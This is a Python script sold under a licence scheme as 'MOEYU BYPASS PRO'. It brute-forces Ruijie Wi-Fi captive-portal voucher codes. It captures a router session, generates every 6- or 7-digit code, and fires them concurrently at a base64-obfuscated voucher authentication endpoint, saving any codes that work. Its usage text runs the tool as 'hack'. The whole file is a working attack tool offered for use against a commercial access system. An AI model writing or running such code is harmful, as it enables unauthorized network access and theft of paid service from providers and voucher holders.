#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import aiohttp
import asyncio
import argparse
import subprocess
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM
# ==========================================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

def get_stable_device_id():
    """စက်၏ HWID ကို ရယူရန်"""
    try:
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not android_id:
            android_id = "OFFLINE_DEVICE"
        return hashlib.md5(android_id.encode()).hexdigest()[:16].lower()
    except:
        return "4f1237767bb7c52c"

def check_license():
    """လိုင်စင် စစ်ဆေးရန်"""
    sys_key = get_stable_device_id()
    print(f"{w}[*] Your HWID: {g}{sys_key}{w}")
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code != 200:
            print(f"{r}[x] License INVALID: SERVER_ERROR{w}")
            return False
        
        lines = response.text.strip().split('\n')
        for line in lines:
            if not line.strip(): continue
            data = [d.strip() for d in line.split(',')]
            if data[0].lower() == sys_key.lower():
                expiry_str = data[2] if len(data) >= 3 else "2026-12-31"
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        print(f"{r}[x] License INVALID: EXPIRED ({expiry_str}){w}")
                        return False
                except: pass
                print(f"{g}[✓] HWID Registered! Access Granted.{w}")
                return True
        print(f"{r}[x] License INVALID: NOT_FOUND{w}")
        return False
    except:
        print(f"{r}[x] License INVALID: NETWORK_ERROR{w}")
        return False

# ==========================================
# COLORS & UI
# ==========================================
w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"
r = "\033[1;31m"; b = "\033[1;34m"

def clear(): os.system("clear")
def Line(): print(f"{y}-" * 50 + f"{w}")

def Logo():
    clear()
    logo = f"""{r}
  __  __  U  ___ u  U _____ u __   __ U  _   u 
 |  \/  |  \/"   "| \| ___"|/ \ \ / /  \| |" | 
 | |\/| |  | |"| |  |  _|"    \ V /    | |_| | 
 | |  | |  | |_| |  | |___    _| |_   <|  _  |>
 |_|  |_|   \___/   |_____|  |_| |_|   |_| |_| 
{w}           >> {g}MOEYU BYPASS PRO v5.2{w} <<
       「 GitHub License Managed System 」"""
    print(logo)
    Line()
    print(f"{w}[#] Developer : Moe Yu")
    print(f"{w}[#] Telegram  : @starlink112")
    print(f"{w}[#] Mode      : Ruijie Internet Bypass")
    Line()

# ==========================================
# CORE BRUTE FORCE LOGIC
# ==========================================
SUCCESS = 0

async def get_session_id(session, session_url, previous_session_id):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    try:
        async with session.get(session_url, headers=headers) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
            return sid
    except: return previous_session_id

async def login_voucher(session, session_id, voucher, file=None, debug=False):
    global SUCCESS
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    try:
        async with session.post(post_url, json=data) as req:
            res = await req.text()
            if 'logonUrl' in res:
                SUCCESS += 1
                print(f'{g}Success: {voucher}{w}')
                with open("success.txt", "a") as f: f.write(voucher+"\n")
            elif debug:
                print(f'{r}Failed: {voucher}{w}', end="\r")
            if file:
                with open(file, "a") as f: f.write(voucher+"\n")
    except: pass

def digit_generator(length):
    return [str(i).zfill(length) for i in range(10**length)]

class VoucherCode:
    def __init__(self, mode, length, speed, tasks, debug):
        self.mode, self.length, self.speed, self.tasks, self.debug = mode, length, speed, tasks, debug
        self.file = f"failed_{mode}_{length}.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except:
            sys.exit(f"{r}[!] Run -o setup first!{w}")

    async def execute(self):
        vouchers = digit_generator(self.length)
        try:
            old = set(open(self.file, "r").read().splitlines())
            vouchers = [v for v in vouchers if v not in old]
        except: pass
        
        Logo()
        print(f"[*] Total Vouchers: {len(vouchers)} | Tasks: {self.tasks}")
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            sid = await get_session_id(session, self.session_url, None)
            tasks_list = []
            for i, v in enumerate(vouchers):
                if i % 90 == 0: sid = await get_session_id(session, self.session_url, sid)
                tasks_list.append(login_voucher(session, sid, v, self.file, debug=self.debug))
                if len(tasks_list) >= self.tasks:
                    await asyncio.gather(*tasks_list)
                    tasks_list = []
            if tasks_list: await asyncio.gather(*tasks_list)

def setup_router():
    Logo()
    try:
        res = requests.get("http://192.168.0.1", timeout=10).url
        with open(".session_url", "w") as f: f.write(res)
        print(f"{g}[✓] Setup Complete! Session Captured.{w}")
    except:
        print(f"{r}[✗] Setup Failed! Check Wi-Fi connection.{w}")

def feature():
    Logo()
    if not check_license(): sys.exit()
    
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-o", "--option", choices=["code", "setup"], required=True)
    parser.add_argument("-l", "--length", choices=[6, 7], type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", type=int, default=100)
    parser.add_argument("-d", "--debug", action="store_true")
    
    try:
        args = parser.parse_args()
        if args.option == "code":
            vobj = VoucherCode("digit", args.length, args.speed, args.tasks, args.debug)
            asyncio.run(vobj.execute())
        elif args.option == "setup":
            setup_router()
    except:
        print(f"\n{y}Usage Guide:{w}")
        print(f"  hack -o setup         (First time setup)")
        print(f"  hack -o code -l 6     (Start 6-digit bypass)")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"Device ID: {get_stable_device_id()}"); sys.exit()
    feature()
